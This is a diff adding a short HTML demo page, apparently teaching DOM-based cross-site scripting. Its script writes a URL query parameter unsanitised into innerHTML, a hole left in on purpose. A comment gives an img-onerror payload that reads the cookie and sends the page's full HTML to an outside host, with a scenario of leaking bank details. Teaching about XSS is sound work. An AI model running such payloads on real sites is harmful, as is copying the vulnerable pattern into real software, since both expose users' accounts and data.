@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Stealing critical Information</title>
+    <style>
+
+    </style>
+</head>
+<body>
+    <!-- Vulnerable code -->
+    <div id="example-div"></div>
+
+    <!-- insert this in the url as query param -->
+    <!-- Suppose I am on my bank account dashboard by injecting this url my entire html is shared with hacker containing my bank details -->
+    <!-- ?name=<img src="empty.gif" onerror="var mycookie=document.cookie; new Image().src=`https://example.p
+hp?output=${document.body.innerHTML}`"/> -->
+
+    <!-- Vulnerable code -->
+    <script>
+        const params = new URLSearchParams(window.location.search);
+        const name = params.get('name');
+        document.getElementById('example-div').innerHTML = `${name}`;
+    </script>
+
+</body>
+</html>
